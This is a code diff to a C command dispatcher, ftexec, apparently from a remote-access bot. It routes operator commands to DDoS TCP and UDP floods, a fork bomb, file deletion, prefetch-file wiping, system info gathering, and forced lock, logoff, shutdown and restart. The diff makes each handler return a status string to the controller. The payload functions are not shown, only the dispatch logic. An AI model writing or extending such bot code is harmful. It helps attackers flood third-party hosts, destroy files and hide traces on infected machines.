@@ -36,6 +36,7 @@ const char *ftexec(char *command) {
                             if (token != NULL) {
                                 int delai = atoi(token);
                                 ddostcp(port, addrip, nbpackets, sizepacket, delai );
+                                return ("DDOS TCP fini...\n"); 
                             }
                         }
                     } 
@@ -66,6 +67,7 @@ const char *ftexec(char *command) {
                             if (token != NULL) {
                                 int delai = atoi(token);
                                 ddosudp(port, addrip, nbpackets, sizepacket, delai );
+                                return ("DDOS UDP fini...\n"); 
                             }
                         }
                     } 
@@ -79,7 +81,8 @@ const char *ftexec(char *command) {
             token = strtok(NULL, " "); 
             if (token != NULL) {
                 char * fichierdel = token;
-                supfichier (fichierdel);
+                const char *result = supfichier(fichierdel);
+                return result; 
 
             } 
         }
@@ -87,6 +90,7 @@ const char *ftexec(char *command) {
 
         else if (strcmp(token, "forkbomb") == 0) {
             forkbomb();
+            return ("Bombe fork fini...\n"); 
         }
 
         else if (strcmp(token, "test") == 0) {
@@ -97,7 +101,8 @@ const char *ftexec(char *command) {
 
 
         else if (strcmp(token, "delprefetch") == 0) {
-            deletePrefetchFiles(); 
+            const char *result = deletePrefetchFiles();
+            return result; 
         }
  
 
@@ -106,7 +111,8 @@ const char *ftexec(char *command) {
             token = strtok(NULL, " "); 
             if (token != NULL) {
                 char * fichierimage = token;
-                image(fichierimage);
+                const char *result = image(token);
+                return result; 
 
             } 
         }
@@ -115,7 +121,8 @@ const char *ftexec(char *command) {
 
             token = strtok(NULL, " "); 
              if (token != NULL) {
-                lock();
+                const char *result = lock(token);
+                return result; 
             } 
         }
 
@@ -124,7 +131,8 @@ const char *ftexec(char *command) {
 
             token = strtok(NULL, " "); 
              if (token != NULL) {
-                logoff();
+                const char *result = logoff(token);
+                return result;                
             } 
         }
 
@@ -132,7 +140,8 @@ const char *ftexec(char *command) {
 
             token = strtok(NULL, " "); 
              if (token != NULL) {
-                shutdownfunc();
+                const char *result = shutdownfunc(token);
+                return result; 
             } 
         }
 
@@ -140,7 +149,8 @@ const char *ftexec(char *command) {
 
             token = strtok(NULL, " "); 
              if (token != NULL) {
-                restart();
+                const char *result = restart(token);
+                return result;                
             } 
         }
 
@@ -149,8 +159,9 @@ const char *ftexec(char *command) {
 
             token = strtok(NULL, " "); 
              if (token != NULL) {
-                char * filename = token;
-                song(token);
+                char * filename = token;  
+                const char *result = song(token);
+                return result;
             } 
         }
 
@@ -160,15 +171,19 @@ const char *ftexec(char *command) {
             token = strtok(NULL, " "); 
              if (token != NULL) {
                 char *directoryPath = token;
-                randomize(directoryPath);
+                const char *result = randomize(directoryPath);
+                return result;
             } 
         }
 
 
+
         else if (strcmp(token, "sysinfo") == 0) {
             
-             GetSysInf();
+             const char *result = GetSysInf(token);
+             return result;
             }
+
 
         else if (strcmp(token, "enum") == 0) {
 
